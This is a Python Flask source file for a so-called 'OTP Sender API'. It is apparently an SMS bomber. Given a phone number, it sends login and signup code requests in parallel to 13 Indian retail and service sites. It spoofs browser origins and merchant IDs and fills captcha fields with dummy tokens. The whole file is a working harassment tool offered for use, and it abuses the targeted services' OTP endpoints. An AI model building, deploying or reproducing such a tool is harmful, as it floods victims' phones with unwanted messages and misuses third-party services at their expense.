from flask import Flask, request, jsonify
import requests
import json
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=13)

@app.after_request
def add_cors(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/')
def home():
    return jsonify({
        "service": "OTP Sender API",
        "usage": "/send?num=1234567890",
        "total_apis": 13,
        "credit": "@BRONX_ULTRA"
    })

# ============ 13 OTP APIs ============

def api_1_oneplay(phone):
    try:
        url = "https://rendermix.oneplay.in/v3/accounts/get_login_otp"
        payload = {"phone": f"+91{phone}", "device": "web", "idempotent_key": str(uuid.uuid4()), "referral_code": ""}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'x-partner-id': "28cceed5-8ab9-11ed-bde5-0ab3c1edb81a", 'origin': "https://www.oneplay.in"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "oneplay", r.status_code
    except: return "oneplay", "FAIL"

def api_2_district(phone):
    try:
        url = "https://www.district.in/gw/auth/generate_otp"
        payload = {"phone_number": phone, "country_code": "91"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'x-app-type': "ed_web", 'x-guest-token': "1212", 'origin': "https://www.district.in"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "district", r.status_code
    except: return "district", "FAIL"

def api_3_prideofcows(phone):
    try:
        url = "https://prideofcows.com/prideofcows/api/customer/login"
        payload = {"MobileNo": phone, "Source": "Desktop", "Type": "signup"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'origin': "https://prideofcows.com"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "prideofcows", r.status_code
    except: return "prideofcows", "FAIL"

def api_4_pw(phone):
    try:
        url = "https://api.penpencil.co/v1/users/register-secure/5eb393ee95fab7468a79d189?smsType=0"
        payload = {"mobile": phone, "countryCode": "+91", "firstName": "User", "subOrgId": "SUB-PWLI000", "captchaToken": "1", "captchaSiteKey": "1"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'randomid': str(uuid.uuid4()), 'client-id': "5eb393ee95fab7468a79d189", 'client-type': "WEB", 'origin': "https://www.pw.live"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "pw", r.status_code
    except: return "pw", "FAIL"

def api_5_shopflo(phone):
    try:
        url = "https://api.shopflo.co/heimdall/api/v1/otp/send"
        payload = {"oid": f"+91{phone}", "merchant_id": "7e84e5aa-092f-4a3d-b61e-34dbfa801c69", "context": "SSO", "sso_request_id": str(uuid.uuid4()), "captcha_token": "1", "captcha_provider": "ALTCHA"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'x-shopflo-version': "stable", 'origin': "https://checkout.shopflo.co"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "shopflo", r.status_code
    except: return "shopflo", "FAIL"

def api_6_provilac(phone):
    try:
        url = "https://pune.provilac.com/restapi/customer/sendOTP/v2"
        params = {'mobileNumber': phone, 'cityName': "Pune", 'resendOtp': "false"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'origin': "https://provilac.com"}
        r = requests.post(url, params=params, headers=headers, timeout=10)
        return "provilac", r.status_code
    except: return "provilac", "FAIL"

def api_7_blinkit(phone):
    try:
        url = "https://blinkit.com/v2/accounts/"
        payload = {'user_phone': phone}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'app_client': "consumer_web", 'rn_bundle_version': "1009003012", 'origin': "https://blinkit.com"}
        r = requests.post(url, data=payload, headers=headers, timeout=10)
        return "blinkit", r.status_code
    except: return "blinkit", "FAIL"

def api_8_gokwik(phone):
    try:
        url = "https://gkx.gokwik.co/v4/auth/otp/login/trigger"
        payload = {"phone": phone, "country": "IN"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'gk-merchant-id': "1rb3imhyis8gv", 'gk-platform': "shopify", 'origin': "https://pdp.gokwik.co"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "gokwik", r.status_code
    except: return "gokwik", "FAIL"

def api_9_milkymist(phone):
    try:
        url = "https://api.rodeodigital.com/identity/api/v1/auth/challenge?ts=1785810208424"
        payload = {"mobile": phone, "appCode": "milkymisted", "challengeType": "SMS-OTP"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'app-code': "milkymisted", 'store-id': "600", 'origin': "https://shop.milkymist.com"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "milkymist", r.status_code
    except: return "milkymist", "FAIL"

def api_10_bigbasket(phone):
    try:
        url = "https://www.bigbasket.com/member-tdl/v3/member/otp"
        payload = {"identifier": phone, "referrer": "unified_login", "recaptchaToken": "1"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'x-channel': "BB-PWA", 'origin': "https://www.bigbasket.com"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "bigbasket", r.status_code
    except: return "bigbasket", "FAIL"

def api_11_zepto(phone):
    try:
        url = "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/"
        payload = {"mobileNumber": phone, "countryCode": "+91"}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json; charset=UTF-8", 'platform': "WEB", 'tenant': "ZEPTO", 'origin': "https://www.zepto.com"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "zepto", r.status_code
    except: return "zepto", "FAIL"

def api_12_justdial(phone):
    try:
        url = "https://www.justdial.com/api/india_api_write/20march2020/sendvcode.php?wap=2&resend=0&randtime=1785810552249&source=2&version=6.7&env=p"
        payload = {"mobile": phone, "fname": ""}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'origin': "https://www.justdial.com"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "justdial", r.status_code
    except: return "justdial", "FAIL"

def api_13_hyperpure(phone):
    try:
        url = "https://www.bigbasket.com/api/user/otpsms?isForgotPassword=true&userPhoneNumber={phone}&source=sign_in"
        payload = {"isForgotPassword": True, "userPhoneNumber": phone}
        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", 'Content-Type': "application/json", 'Host': "api.hyperpure.com", 'origin': "https://www.hyperpure.com"}
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        return "hyperpure", r.status_code
    except: return "hyperpure", "FAIL"

# ============ MAIN ENDPOINT ============
@app.route('/send')
def send_otp():
    phone = request.args.get('num', '').strip()
    
    if not phone or not phone.isdigit() or len(phone) < 10:
        return jsonify({"error": "Valid 10-digit number required", "usage": "/send?num=1234567890"}), 400
    
    start = time.time()
    
    # 🔥 ALL 13 APIs PARALLEL
    apis = [api_1_oneplay, api_2_district, api_3_prideofcows, api_4_pw, api_5_shopflo,
            api_6_provilac, api_7_blinkit, api_8_gokwik, api_9_milkymist, api_10_bigbasket,
            api_11_zepto, api_12_justdial, api_13_hyperpure]
    
    futures = {executor.submit(api, phone): api.__name__ for api in apis}
    
    results = {}
    success = 0
    failed = 0
    
    for f in as_completed(futures):
        name = futures[f]
        try:
            api_name, status = f.result(timeout=15)
            results[api_name] = "✅ SENT" if status == 200 else f"⚠️ {status}"
            if status == 200: success += 1
            else: failed += 1
        except:
            results[name] = "❌ TIMEOUT"
            failed += 1
    
    rt = round(time.time() - start, 2)
    
    return jsonify({
        "status": "completed",
        "number": phone,
        "response_time_seconds": rt,
        "total_apis": 13,
        "sent": success,
        "failed": failed,
        "details": results,
        "credit": "@BRONX_ULTRA"
    })

@app.route('/health')
def health():
    return jsonify({"status": "online"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 3000))
    app.run(host='0.0.0.0', port=port)
